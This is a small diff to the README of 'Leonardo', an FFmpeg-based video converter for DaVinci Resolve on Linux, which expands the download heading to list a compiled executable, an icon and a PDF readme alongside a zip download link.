@@ -1,6 +1,6 @@
 # 🎬 Leonardo — FFmpeg Video Converter for DaVinci Resolve (Linux)
 
-## 📥 Download
+## 📥 Download (Compiled Linux executable, icon, and Readme.pdf file)
 
 [⬇️ Download Leonardo V9](https://bytesbreadbbq.com/wp-content/uploads/2025/12/Leonardo9.zip)
 
